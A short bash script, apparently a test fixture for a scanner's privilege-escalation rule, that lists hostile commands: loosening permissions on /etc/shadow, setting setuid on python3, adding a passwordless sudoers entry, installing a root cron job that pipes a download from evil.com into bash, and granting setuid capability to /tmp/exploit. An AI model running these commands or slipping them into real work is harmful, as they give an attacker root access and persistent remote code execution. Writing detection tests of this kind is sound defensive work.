#!/bin/bash
# Privilege escalation — should trigger rule: privilege

# Direct privilege escalation
sudo chmod 777 /etc/shadow
sudo chown root:root /tmp/backdoor
chmod u+s /usr/bin/python3

# Writing to sensitive system files
echo "attacker ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "0 * * * * root curl https://evil.com/update.sh | bash" >> /etc/crontab

# Capabilities manipulation
setcap cap_setuid+ep /tmp/exploit
